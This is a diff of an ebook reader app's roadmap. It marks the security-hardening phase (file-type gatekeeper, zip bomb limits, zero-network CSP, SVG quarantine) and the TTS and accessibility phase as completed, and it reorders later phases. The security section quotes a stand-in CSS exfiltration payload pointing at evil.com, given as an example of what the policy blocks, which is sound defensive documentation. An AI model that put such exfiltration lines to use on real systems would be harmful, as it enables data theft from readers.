@@ -38,13 +38,13 @@
 ├──────────────────────────────────────────────┤
 │  PHASE 8.6: 30-Day GC & Bi-Delete Sync   ✅  │
 ├──────────────────────────────────────────────┤
-│  PHASE 8.8: Storage Armor & Gatekeeper   ⏳  │ <── [ NEXT STAGE ]
+│  PHASE 8.8: Storage Armor & Gatekeeper   ✅  │
 ├──────────────────────────────────────────────┤
-│  PHASE 9: Mobile Release Train & Stores  ⏳  │
-├──────────────────────────────────────────────┤
-│  PHASE 10: TTS Audio & Accessibility     ⏳  │
+│  PHASE 10: TTS Audio & Accessibility     ✅  │
 ├──────────────────────────────────────────────┤
 │  PHASE 11: Freemium, E2EE & Self-Hosting 🔮  │
+├──────────────────────────────────────────────┤
+│  PHASE 12: Mobile Release Train & Stores 🚀  │ <── [ NEXT STAGE ]
 └──────────────────────────────────────────────┘
 ```
 
@@ -217,29 +217,29 @@
 
 ---
 
-### Phase 8.8: Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox ⏳
-*Status: Planned*
+### Phase 8.8: Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox ✅
+*Status: Completed*
 
-- [ ] **Pre-Flight Ingestion Gatekeeper (`fileValidator.ts`)**:
+- [x] **Pre-Flight Ingestion Gatekeeper (`fileValidator.ts`)**:
   - **Magic Bytes Verification**:
     - PDF: Byte prefix check for `%PDF-` (`0x25 0x50 0x44 0x46`) and end-of-file trailer check for `%%EOF`.
     - EPUB: Local File Header check for `PK\x03\x04` (`0x50 0x4B 0x03 0x04`) and IDPF/W3C OCF uncompressed `mimetype` entry check for exact ASCII string `application/epub+zip`.
   - **Storage Abuse Firewall**: Rejects disguised Windows PE binaries (`.exe`), shell scripts, and corrupt archives at the door; immediately aborts local SQLite/IndexedDB insertion and completely cuts off Google Drive upload APIs to prevent Drive storage abuse or account flagging.
-- [ ] **Decompression Defense (Zip Bomb & DoS Shield)**:
+- [x] **Decompression Defense (Zip Bomb & DoS Shield)**:
   - **Central Directory Pre-Flight Scan**: Inspects ZIP Central Directory metadata records before any in-memory inflation / `pako` buffer allocation.
   - **Safety Ceiling Thresholds**:
     - `MAX_TOTAL_UNCOMPRESSED_SIZE`: Caps cumulative uncompressed size at 300 MB.
     - `MAX_DECOMPRESSION_RATIO`: Rejects archives exceeding 100:1 compression ratio (e.g. 1MB compressed -> 150MB uncompressed).
     - `MAX_ENTRY_COUNT`: Caps maximum inner files at 2,000 to prevent Directory Tree Exhaustion attacks.
-- [ ] **Zero-Exfiltration Sandbox & SVG Quarantine**:
+- [x] **Zero-Exfiltration Sandbox & SVG Quarantine**:
   - **Super CSP (Zero-Network Content Security Policy)**:
-    - Enforces `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` inside reader viewer frames.
+    - Enforces `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' blob:; worker-src blob:; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` inside reader viewer frames.
     - `connect-src 'none'` completely neutralizes all outbound network primitives (`fetch`, `XHR`, `WebSocket`).
     - `img-src blob: data:` and `font-src blob: data:` strictly prohibit external HTTP/HTTPS assets, completely eliminating CSS-based character exfiltration (`url('https://evil.com/leak?q=...')`).
   - **W3C SVG Security Isolation**:
     - Enforces rasterized/quarantined rendering via `<img>` tags (`<img src="blob:...">`), ensuring the browser runtime disables 100% of embedded `<script>` execution and DOM event handlers within SVG images.
-    - Strict prohibition of raw inline `<svg>` or `<object type="image/svg+xml">` injections.
-- [ ] **Automated Security Verification & Audit Suite**:
+    - Strict prohibition of raw inline `<svg>` or `<object type="image/svg+xml">` injections; actively strips `<script>` tags and `on*` event handlers from loaded SVGs.
+- [x] **Automated Security Verification & Audit Suite**:
   - Unit tests validating rejection of disguised binaries (`malware.exe` as `test.pdf`), Zip Bomb payloads, and malicious CSS trackers.
 
 ---
@@ -261,20 +261,22 @@
 
 ---
 
-### Phase 10: Audio Narration (TTS) & Accessibility ⏳
-*Status: Planned*
+### Phase 10: Audio Narration (TTS) & Accessibility ✅
+*Status: Completed*
 
-- [ ] **On-Device Text-to-Speech (TTS)**:
+- [x] **On-Device Text-to-Speech (TTS)**:
   - Integration with `expo-speech` on mobile (utilizing local system voices for English, Vietnamese, Japanese, etc.).
-  - Integration with Web Speech Synthesis API on desktop browsers.
-- [ ] **Synchronized Reading UI**:
-  - Real-time sentence-by-sentence highlight tracking audio voice playback.
-  - Play, pause, speed control (0.75x - 2.0x), and skip sentence shortcuts.
-- [ ] **Background Audio & Media Notification**:
-  - Lock-screen media playback controls on iOS and Android.
-- [ ] **Enhanced Accessibility**:
-  - Dyslexia-friendly font toggles (OpenDyslexic).
-  - Bionic reading mode and high-contrast color schemes.
+  - Integration with Web Speech Synthesis API on desktop browsers with Chrome 15s keepalive defense.
+- [x] **Smart Voice Selection & Settings**:
+  - In-app Voice Picker modal categorizing recommended voices matching current app/book language, plus audio sample preview testing.
+  - Speech rate controls (0.75x - 2.0x), pitch, and auto-sentence advance toggle persisted to SQLite `sync_meta`.
+- [x] **Synchronized Reading UI & Reader Bridge**:
+  - `TTSPlayerBar` floating playback controller (play, pause, next sentence, previous sentence, speed cycling, sentence counter).
+  - Sentence segmentation engine with Vietnamese title and honorific abbreviation protection.
+  - Reader bridge text extraction (`GET_CURRENT_TEXT` -> `TEXT_EXTRACTED`) across both EPUB and PDF reader frames.
+- [x] **Accessibility & Localization**:
+  - Complete i18n support across 7 languages (`vi`, `en`, `ja`, `zh`, `fr`, `es`, `de`).
+  - Unit test suite verifying sentence segmentation, decimal protection, and voice priority filtering.
 
 ---
 
@@ -308,9 +310,11 @@
 | **D1 Sync & Quota Defense** | 7 | ✅ Done | ✅ Done | ✅ Done | ✅ Live |
 | **Google Drive & Info Lock (E2EE)** | 8 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
 | **Privacy, DMCA & Security Portal** | 8 | ✅ Done | ✅ Done | ✅ Done | N/A |
-| **Community Bookshelf & OPDS** | 8.5 | ⏳ Next | ⏳ Next | ⏳ Next | ⏳ Next |
-| **EAS Build & Store Release** | 9 | N/A | 📋 Planned | 📋 Planned | N/A |
-| **EAS OTA Updates** | 9 | N/A | 📋 Planned | 📋 Planned | N/A |
-| **Text-to-Speech (TTS)** | 10 | 📋 Planned | 📋 Planned | 📋 Planned | N/A |
+| **Community Bookshelf & OPDS** | 8.5 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
+| **30-Day GC & Bi-Delete Sync** | 8.6 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
+| **Storage Armor & Gatekeeper** | 8.8 | ✅ Done | ✅ Done | ✅ Done | N/A |
+| **Text-to-Speech (TTS) & Accessibility** | 10 | ✅ Done | ✅ Done | ✅ Done | N/A |
 | **Freemium & In-App Purchase** | 11 | 🔮 Future | 🔮 Future | 🔮 Future | 🔮 Future |
 | **Self-Hostable Worker Package** | 11 | 🔮 Future | 🔮 Future | 🔮 Future | 🔮 Future |
+| **EAS Build & Store Release Train** | 12 | N/A | 📋 Deferred | 📋 Deferred | N/A |
+| **EAS OTA Updates** | 12 | N/A | 📋 Deferred | 📋 Deferred | N/A |
